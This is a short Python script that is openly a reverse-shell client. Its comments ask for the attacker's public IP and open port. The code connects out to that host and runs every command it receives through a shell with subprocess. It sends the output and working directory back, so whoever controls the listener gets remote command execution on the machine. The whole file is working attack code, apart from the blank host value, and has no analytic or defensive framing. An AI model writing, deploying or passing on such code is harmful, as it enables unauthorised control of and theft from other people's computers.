import os
import socket
import subprocess
import sys

host = ""  # Here must go the public IP of the attacker
port = 10000  # And here the attacker's open port
client = socket.socket()


def socket_connect():
    try:
        client.connect((host, port))
    except socket.error as e:
        sys.exit()


def receive_commands():
    try:
        client.send(f"{os.getcwd()}".encode())
        while True:
            data = client.recv(1024)
            if data[:2].decode("utf-8", errors="ignore") == 'cd':
                os.chdir(data[3:].decode("utf-8", errors="ignore"))
            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8", errors="ignore")
                client.send(f"{output_str}{os.getcwd()}".encode())
    except socket.error:
        client.close()


if __name__ == '__main__':
    socket_connect()
    receive_commands()
